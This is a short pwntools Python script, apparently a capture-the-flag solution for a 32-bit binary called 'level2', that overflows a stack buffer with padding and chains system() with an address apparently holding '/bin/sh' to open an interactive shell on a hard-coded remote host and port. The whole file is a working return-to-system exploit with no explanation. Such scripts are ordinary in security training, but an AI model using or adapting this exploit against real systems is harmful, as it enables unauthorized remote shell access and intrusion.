from pwn import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./level2"
# libc_binary = "./"

# p = process(argv=[binary])
p = remote("220.249.52.133",55744)

elf = ELF(binary)
# libc = ELF(libc_binary)
context.arch = "i386"
system = 0x8048320
payload = flat([
    "a"*(0x88+4),system,0xdeadbeef,0x0804a024
])

p.send(payload)

p.interactive()
